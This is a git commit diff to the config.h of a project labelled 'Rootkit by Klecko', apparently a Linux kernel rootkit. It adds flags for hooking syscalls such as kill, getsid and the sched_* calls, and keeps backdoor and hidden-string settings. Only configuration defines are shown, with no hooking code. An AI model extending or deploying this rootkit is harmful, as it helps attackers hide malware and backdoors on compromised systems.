e8733383577d1f940cc56a71af5ae7430dbb5b51
klesoft <davidete345@gmail.com>
2020-01-05 20:42:32 +0100

    Added 7 more hooks UNTESTED

--- src/config.h
+++ src/config.h
@@ -7,7 +7,11 @@ MODULE_DESCRIPTION("Rootkit by Klecko");
 MODULE_VERSION("0.1");
 
 #define HIDE_MODULE      0
+#define BACKDOOR         0
+
+#define HIDE_STR "HiddenKlecko"
 #define PROC_FILENAME    "rootkit_proc"
+
 #define HOOK_GETDENTS    1
 #define HOOK_GETDENTS64  1
 #define HOOK_STAT        1
@@ -16,8 +20,12 @@ MODULE_VERSION("0.1");
 #define HOOK_GETPRIORITY 1
 #define HOOK_OPEN        1
 #define HOOK_OPENAT      1
-#define BACKDOOR         0
-
-#define HIDE_STR "HiddenKlecko"
+#define HOOK_GETPGID     1
+#define HOOK_GETSID      1
+#define HOOK_SCHED_GETAFFINITY     1
+#define HOOK_SCHED_GETPARAM        1
+#define HOOK_SCHED_GETSCHEDULER    1
+#define HOOK_SCHED_RR_GET_INTERVAL 1
+#define HOOK_KILL        1
 
 #endif
